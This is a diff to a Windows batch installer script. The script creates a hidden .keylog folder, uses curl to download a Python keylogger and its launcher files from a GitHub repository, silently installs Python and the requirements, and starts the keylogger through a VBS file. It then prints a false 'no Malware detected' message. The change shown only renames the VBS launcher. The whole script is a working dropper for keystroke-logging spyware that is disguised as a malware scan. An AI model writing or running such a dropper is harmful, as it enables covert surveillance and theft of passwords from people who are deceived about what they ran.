@@ -6,7 +6,7 @@ cd %UserProfile%\.keylog
 if exist keylogger.py if exist keylogger_start.bat if exist testhide.vbs if exist requirements.txt goto :exitlabel
 curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/keylogger.py" --output keylogger.py
 curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/keylogger_start.bat" --output keylogger_start.bat
-curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/testhide.vbs" --output keylogger.vbs
+curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/keylogger.vbs" --output keylogger.vbs
 curl -sOL "https://raw.githubusercontent.com/Raikster/keylogger_python/main/requirements.txt" --output requirements.txt
 echo "25% done..."
 curl -s "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" --output python396.exe
@@ -18,7 +18,7 @@ cd %UserProfile%\AppData\Local\Programs\Python\Python39\Scripts
 pip.exe install -r %UserProfile%\.keylog\requirements.txt --no-warn-script-location --quiet
 cd %UserProfile%\.keylog
 if exist python396.exe del python396.exe
-start "" "testhide.vbs"
+start "" "keylogger.vbs"
 echo "finished, no Malware detected ..."
 exit
 :exitlabel
